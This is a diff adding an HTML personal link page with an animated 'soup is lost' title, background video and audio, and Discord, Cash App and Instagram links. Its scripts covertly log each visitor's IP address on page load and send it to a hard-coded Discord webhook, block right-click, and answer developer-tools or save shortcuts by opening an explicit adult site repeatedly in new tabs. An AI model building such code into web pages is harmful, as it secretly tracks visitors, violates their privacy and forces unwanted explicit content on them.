@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>᲼᲼᲼</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="shortcut icon" href="blacked.png" type="image/webp"> <!--the tab image -->
+
+    <script>
+    var words = ["s", "so", "sou", "soup", "soup i", "soup is", 'soup is l','soup is lo','soup is los','soup is lost','soup is los','soup is lo', 'soup is l','soup i','soup','sou','so','s','᲼᲼'];
+    var currentIndex = 0;
+
+    function updateTitle() {
+      document.title = words[currentIndex];
+      currentIndex = (currentIndex + 1) % words.length; 
+    }
+    setInterval(updateTitle, 500);
+    </script>
+</head>
+
+
+<body>
+<div class="tint"></div>
+
+<video autoplay loop muted playsinline  id="video-background">
+  <source src="youtube_D1mS7tai_H0_1920x1080_h264.mp4" type="video/mp4">
+</video>
+
+<div class = container>
+
+  <div class ='containerbox'>
+  <div class="a-box"></div>
+  </div>
+
+  <div class="containertxt">
+      <h1>i am <span class="auto-type"></span> </h1>
+  </div>
+
+    <div class='title'>
+      <a href="#" onclick="window.location.reload();">
+        <img id="myImg" src="blacked.png">
+      
+    </div>
+
+   
+      <div class = bio-1>
+        <a href="https://discord.gg/DjJgNtG3Re" target="_blank"><i class='bx bxl-discord-alt'></i></a>
+      </div>  
+
+      <div class = bio-2>
+        <a href="https://cash.app/$OsenOran" target="_blank"><i class='bx bx-wallet' ></i></a>
+      </div> 
+
+      <div class = bio-3>
+        <a href="https://www.instagram.com/510soup/" target="_blank"><i class='bx bxl-instagram' ></i></a>
+      </div>
+      
+
+</div>
+
+
+
+<div id="overlay">
+<div id="message">⚬ enter domain ⚬</div>
+
+
+</div>   
+<div id="content">   
+</div>
+
+
+<audio id="audio"loop>
+  <source src="aestheticsss.mp3" type="audio/mpeg">
+</audio>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+
+<script>
+    var typed = new Typed(".auto-type",{
+      strings : ["lost","who","you","me","soup"],
+      typeSpeed : 90,
+      backSpeed : 50,
+      loop : true
+    })
+</script>
+
+
+<script>
+    function disableRightClick(event) {
+        event.preventDefault();
+    }
+    document.addEventListener('contextmenu', disableRightClick);
+</script>
+
+
+
+<script>
+   document.addEventListener("keydown", function(e) {
+    if ((e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.shiftKey && e.key === "J"))  {
+        for (let i = 0; i < 5; i++) {
+            window.open("https://hentai-cuv.pages.dev/", "_blank");
+        }
+        e.preventDefault();
+        e.stopPropagation();
+    }
+
+    if (e.ctrlKey && e.key === "s") {
+        window.open("https://hentai-cuv.pages.dev/", "_blank");
+        e.preventDefault();
+        e.stopPropagation();
+    }
+});
+</script>
+
+
+
+<!--DOMAIN OVERLAY-->
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    var overlay = document.getElementById("overlay");
+    var audio = document.getElementById("audio");
+
+    overlay.addEventListener("click", function () {
+      overlay.style.opacity = "0";
+      audio.style.opacity = "1"; 
+      setTimeout(function () {
+        overlay.style.display = "none";
+        document.body.style.overflow = "auto";
+        audio.play();
+      }, 500);
+    });
+  });
+</script>
+
+
+<script>
+        function sendToDiscord(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1210133173305085962/Ym2LySNez3MaQNDyTPogqQWZkOMFcuCTxCJfMytLA-uS3cptq6I4U7PzRU7VR-MNjnkr';
+            const data = { content: `soup-bot sent ip: ${ip}` };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('IP sent to Discord'))
+            .catch(error => console.error('Error sending IP to Discord:', error));
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+                sendToDiscord(ip);
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+            }
+        }
+        getIP();
+</script>
+
+<!--CSS AND SATUFF-->
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Manrope&family=Raleway:ital,wght@0,100..900;1,100..900&display=swap');
+
+
+
+body {
+background-color: #000000;
+background-repeat: no-repeat;
+font-family: "Manrope", sans-serif;
+background-size: cover;
+background-attachment: fixed;
+cursor: url('https://cur.cursors-4u.net/games/gam-4/gam379.cur'), auto !important;
+}
+
+
+.tint {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(255, 236, 208, 0.096); 
+}
+.container {
+    position: fixed;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 150px;
+    bottom: 45%;
+    right: calc(50% - 100px); 
+    transform: scale(3);
+    backdrop-filter: blur(7.2px);
+    filter: drop-shadow(2px 3px 10px rgb(255, 254, 251));
+    z-index: 1;
+}
+
+
+.containerbox{
+position: fixed;
+right: 25.5%;
+bottom: -15%;
+filter: drop-shadow(2px 3px 10px black);
+text-shadow: 0 0 10px #fff;
+
+}
+.a-box {
+  width: 90px;
+  height: 120px;
+  background-color: rgba(255, 250, 232, 0.127) !important;
+  z-index: 0;
+  border-top-left-radius: 50px;
+  border-top-right-radius: 2%;
+  border-bottom-left-radius: 15px;
+  border-bottom-right-radius: 10px;
+  border: 1px solid rgb(28, 21, 20);
+  outline: 0.1px solid rgb(28, 21, 20);
+  outline-offset: 1px; 
+  backdrop-filter: blur(5px);
+  box-shadow: 0 0 2.5px #000000;
+}
+
+.containertxt{
+  position: absolute;
+  width: 100%;
+  top: -55px;
+  right: 7px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+ 
+}
+
+.containertxt h1{
+  color: rgba(28, 21, 20, 0.366);
+  transform: scale(0.400);
+  text-shadow:  0 0 6px #fff,
+}
+
+.bio-1{
+opacity: 45%;
+position: absolute;
+text-decoration: none;
+color: rgb(0, 0, 0);
+left: 30.3px;
+transition: transform 0.3s ease, filter 0.3s ease;
+}
+
+
+
+.bio-1:hover {
+  opacity: 100%;
+  transform: translateY(-2px);
+  filter: drop-shadow(2px 3px 10px rgb(255, 255, 255));
+}
+
+.bio-2{
+position: relative;
+right: 8px;
+opacity: 45%;
+color: rgb(0, 0, 0);
+transition: transform 0.3s ease, filter 0.3s ease;
+}
+.bio-2:hover {
+  opacity: 100%;
+  transform: scale(1.1);
+  transform: translateY(-2px);
+  filter: drop-shadow(2px 3px 10px rgb(255, 255, 255));
+}
+.bio-3{
+opacity: 45%;
+color: black;
+transition: transform 0.3s ease, filter 0.3s ease;
+position: absolute;
+right: 47px;
+
+
+}
+.bio-3:hover {
+opacity: 100%;
+transform: translateY(-2px);
+filter: drop-shadow(2px 3px 10px rgb(255, 255, 255));
+}
+
+.title{
+  position: absolute;
+  top: -158%;
+  transform: scale(.200);
+  filter: drop-shadow(2px 3px 10px black);
+}
+
+.title img{
+  position: absolute;
+  top: -350px;
+  right: -230px;
+  transform: scale(.414);
+  z-index: -1;
+  transition: opacity 0.8s ease;
+  transition: transform 0.3s ease, filter 0.8s ease;
+  border: 3px solid rgb(28, 21, 20);
+  border-top-left-radius: 45%; 
+  border-top-right-radius: 5%; 
+  border-bottom-left-radius: 25%; 
+  border-bottom-right-radius: 30%; 
+  outline: 8px solid rgb(28, 21, 20);
+  outline-offset: 18px; 
+  opacity: 60%;
+}
+
+.title img:hover{
+  opacity: 100%;
+  transform: scale(.400);
+  
+  
+
+}
+
+
+a {
+color: rgb(28, 21, 20);
+cursor: url('https://cur.cursors-4u.net/games/gam-4/gam379.cur'), auto !important;
+}
+
+#video-background {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+z-index: -1;
+object-fit: cover; 
+}
+
+#audio {
+  opacity: 0;
+  transition: opacity 1s ease-in-out;
+}
+
+#overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgb(27, 27, 27);
+display: flex;
+justify-content: center;
+align-items: center;
+z-index: 1000;
+opacity: 1; 
+transition: opacity 0.5s; 
+pointer-events: auto; 
+}
+
+#message {
+font-size: 24px;
+color: rgb(10, 10, 10);
+cursor: pointer;
+}
+
+
+
+
+@media (max-width: 430px) {
+    .container {
+      bottom: 40%;      
+    }   
+}
+
+@media (max-width: 430px) {
+    .containertxt {
+      top: -55px;      
+    }   
+}
+</style>
+
+
+
+</body>
+</html>
